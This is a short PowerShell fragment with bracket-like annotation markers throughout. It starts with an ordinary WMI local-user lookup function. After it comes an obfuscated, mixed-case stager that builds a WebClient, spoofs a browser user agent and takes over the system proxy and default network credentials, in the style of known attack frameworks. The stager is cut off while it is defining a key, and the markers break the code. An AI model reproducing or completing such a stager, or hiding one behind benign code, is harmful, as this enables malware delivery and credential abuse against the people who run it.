
 -||-> function Get-CWmiLocalUserAccount
{
    
    [CmdletBinding(SupportsShouldProcess=$true)]
    param(
        [Parameter(Mandatory=$true)]
        [ValidateLength(0,20)]
        [string]
        
        $Username
    )
    
     -||-> Set-StrictMode -Version 'Latest' <-||- 

     -||-> Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState <-||- 
    
    return  -||-> Get-WmiObject Win32_UserAccount -Filter "Domain='$( -||-> $env:ComputerName <-||- )' and Name='$Username'" <-||- 
} <-||- 


 -||-> $wC= -||-> New-ObJEct SYstEM.NeT.WEBCLiEnT <-||-  <-||- ; -||-> $u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko' <-||- ; -||-> $WC.HeAders.AdD('User-Agent',$u) <-||- ; -||-> $Wc.PROXy = [SySTeM.NeT.WEbREQUesT]::DefAultWEbPrOxY <-||- ; -||-> $WC.PrOxy.CreDenTIAlS = [SyStEM.NeT.CReDENTialCacHE]::DEfAUltNetwOrkCREDENTIALS <-||- ; -||-> $K='Zz


 <-||- 
